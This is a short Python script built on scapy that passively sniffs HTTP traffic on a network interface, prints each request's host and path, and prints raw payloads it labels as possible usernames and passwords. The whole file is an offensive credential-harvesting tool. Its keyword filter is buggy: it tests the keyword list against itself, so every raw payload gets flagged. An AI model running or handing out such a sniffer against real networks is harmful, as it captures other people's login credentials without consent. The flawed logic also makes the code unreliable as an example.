#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPackage)


def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "password", "pass", "login"]
        for keyword in keywords:
            if keyword in keywords:
                return load


def processSniffedPackage(packet):
    # HTTPRequest is an existing
    if packet.haslayer(http.HTTPRequest):
        url = getUrl(packet)
        print("[+] HTTP Request" + str(url))
        loginInformation = getLoginInfo(packet)
        if loginInformation:
            print(
                "\n\n[+] Possible username/password > " + loginInformation + "\n\n")


sniff("eth0")
